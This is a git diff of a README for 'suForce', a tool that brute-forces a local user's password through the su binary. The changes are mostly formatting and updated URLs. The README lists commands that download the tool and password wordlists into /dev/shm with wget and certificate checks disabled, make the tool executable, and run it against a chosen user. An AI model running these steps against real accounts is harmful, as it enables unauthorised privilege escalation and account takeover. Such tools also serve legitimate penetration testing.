@@ -1,27 +1,29 @@
-# suForce
+# **suForce**
 
-**Obtains a user's password by abusing the su binary.**
+### Obtains a user's password by abusing the su binary.
 
-![](/screenshot.png)
+![](/img/img.png)
 
-- <kbd>Download suForce</kbd>
+---
+
+## Download suForce
 
 ```sh
 cd /dev/shm
-wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce"
+wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
 chmod +x suForce
 ```
 
-- <kbd>Download Wordlist (Optional)</kbd>
+## Download Wordlist (Optional)
 
 ```sh
-wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/techyou.txt"
-wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/top12000.txt"
+wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt"
+wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt"
 ```
 
-- <kbd>Usage</kbd>
+## Usage
 
-```cmd
+```sh
 ./suForce -u <USER> -w <WORDLIST>
 ```
 
